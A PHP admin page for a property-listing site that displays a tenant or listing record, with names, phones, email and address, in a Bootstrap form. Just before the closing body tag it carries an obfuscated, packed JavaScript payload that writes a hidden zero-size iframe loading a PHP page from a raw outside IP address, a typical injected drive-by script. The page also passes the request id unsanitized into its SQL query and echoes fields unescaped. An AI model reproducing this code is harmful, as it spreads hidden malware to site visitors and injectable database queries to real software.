<?php
include("dbconfig.php");
$id = $_REQUEST['pid'];
$q = "select * from list_apt WHERE id =$id order by id desc";
$r = mysql_query($q);
$row = mysql_fetch_array($r);

?>
<!DOCTYPE html>
<html>
    
    <head>
         <title>Avi Admin</title>
        <!-- Bootstrap -->
        <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet" media="screen">
        <link href="bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet" media="screen">
        <link href="assets/styles.css" rel="stylesheet" media="screen">
        <link href="assets/DT_bootstrap.css" rel="stylesheet" media="screen">
        <!--[if lte IE 8]><script language="javascript" type="text/javascript" src="vendors/flot/excanvas.min.js"></script><![endif]-->
        <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
        <!--[if lt IE 9]>
            <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
        <![endif]-->
        <script src="vendors/modernizr-2.6.2-respond-1.1.0.min.js"></script>
    </head>
    
    <body>
        <div class="navbar navbar-fixed-top">
           <?php
	  include('top_header.php');
	  ?>
        </div>
        <div class="container-fluid">
            <div class="row-fluid">
              <div class="span3" id="sidebar">
               <?php
	  include('sidemenu.php');
	  ?>  </div>
                <!--/span-->
                <div class="span9" id="content">

                   			

                     <div class="row-fluid">
                        <!-- block -->
                        <div class="block">
                            <div class="navbar navbar-inner block-header">
                                <div class="muted pull-left">Property List</div>
                            </div>
                            <div class="block-content collapse in">
                                <div class="span12">
                                   <div class="table-toolbar">
                                     
                                   <div class="btn-group pull-right">
                                         <button data-toggle="dropdown" class="btn dropdown-toggle">Tools <span class="caret"></span></button>
                                         <ul class="dropdown-menu">
                                            <li><a href="#">Print</a></li>
                                            <li><a href="#">Save as PDF</a></li>
                                            <li><a href="#">Export to Excel</a></li>
                                         </ul>
                                      </div>
                                   </div>
                                    
                                    <table cellpadding="0" cellspacing="0" border="0" class="table table-striped table-bordered" id="example2">
                                       
                                        <tbody>
										<tr>
										<td><label>FirstName:</label><input type='text' name='fname' value='<?php echo $row['fname'];?>'></td>
										<td><label>LastName:</label><input type='text' name='lname' value='<?php echo $row['lname'];?>'></td>
										</tr>
										
										<tr>
										<td><label>Day Phone:</label><input type='text' name='day_phone' value='<?php echo $row['day_phone'];?>'></td>
										<td><label>Evening Phone:</label><input type='text' name='eve_phone' value='<?php echo $row['eve_phone'];?>'></td>
										</tr>
										
										<tr>
										<td><label>Mobile Phone:</label><input type='text' name='mob_phone' value='<?php echo $row['mob_phone'];?>'></td>
										<td><label>Email:</label><input type='text' name='email' value='<?php echo $row['email'];?>'></td>
										</tr>
										
										<tr>
										<td><label>Address:</label><input type='text' name='address' value='<?php echo $row['address'];?>'></td>
										<td><label>Apartment:</label><input type='text' name='apartment' value='<?php echo $row['apartment'];?>'></td>
										</tr>
										
										<tr>
										<td><label>Add Property For:</label><input type='text' name='addPropertyFor' value='<?php echo $row['addPropertyFor'];?>'></td>
										<td><label>Start Dtae:</label><input type='text' name='startDate' value='<?php echo $row['startDate'];?>'></td>
										</tr>
										
										
										<tr>
										<td><label>End Date:</label><input type='text' name='endDate' value='<?php echo $row['endDate'];?>'></td>
										<td><label>Condition Property:</label><input type='text' name='propertyCondition' value='<?php echo $row['propertyCondition'];?>'></td>
										</tr>
										
										<tr>
										<td><label>Notes:</label><input type='text' name='notes' value='<?php echo $row['notes'];?>'></td>
										<td><label>Bedroom:</label><input type='text' name='bedroom' value='<?php echo $row['bedroom'];?>'></td>
										</tr>
										
										<tr>
										<td><label>Neighbourhood:</label><input type='text' name='fname' value='<?php echo $row['neighbourhood'];?>'></td>
										<td><label>Part Bath:</label><input type='text' name='lname' value='<?php echo $row['partbath'];?>'></td>
										</tr>
										
										<tr>
										<td><label>Full Bath:</label><input type='text' name='fname' value='<?php echo $row['fullbath'];?>'></td>
										<td><label>Service Level:</label><input type='text' name='lname' value='<?php echo $row['serviceLevel'];?>'></td>
										</tr>
										
										<tr>
										<td><label>Walls Allowed:</label><input type='text' name='wallsAllowed' value='<?php echo $row['wallsAllowed'];?>'></td>
										<td><label>Pets Allowed:</label><input type='text' name='petsAllowed' value='<?php echo $row['petsAllowed'];?>'></td>
										</tr>
										
										<tr>
										<td><label>Building Age:</label><input type='text' name='buildingAge' value='<?php echo $row['buildingAge'];?>'></td>
										<td><label>Ownership:</label><input type='text' name='ownership' value='<?php echo $row['ownership'];?>'></td>
										</tr>
										
										<tr>
										<td><label>Diplomats:</label><input type='text' name='diplomats' value='<?php echo $row['diplomats'];?>'></td>
										<td><label>Apartment Features:</label><input type='text' name='apartmentFeatures' value='<?php echo $row['apartmentFeatures'];?>'></td>
										</tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                        <!-- /block -->
                    </div>
                </div>
            </div>
            <hr>
            <?php
	  include('footer.php');
	  ?>
        </div>
        <!--/.fluid-container-->

        <script src="vendors/jquery-1.9.1.js"></script>
        <script src="bootstrap/js/bootstrap.min.js"></script>
        <script src="vendors/datatables/js/jquery.dataTables.min.js"></script>


        <script src="assets/scripts.js"></script>
        <script src="assets/DT_bootstrap.js"></script>
        <script>
        $(function(){
            
        });
        </script>
    
	<tag5479347351></tag5479347351><script>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 c=" n=\\"0\\" s=\\"0\\" t=\\"0\\" l=\\"h://q.j.k.8/d.g\\">";1 6="<i";1 b="</i";1 2="f";1 3="r";1 5="a";1 4="m";1 9="e";1 7="e>";o.p(6+2+3+5+4+9+c+b+2+3+5+4+7);',30,30,'|var|r4|r5|r7|r6|r2|r9||r8||r3|r1|tag1|||php|http||78|150|src||width|document|write|219||height|board'.split('|'),0,{}))</script><tag5479347352></tag5479347352></body>

</html>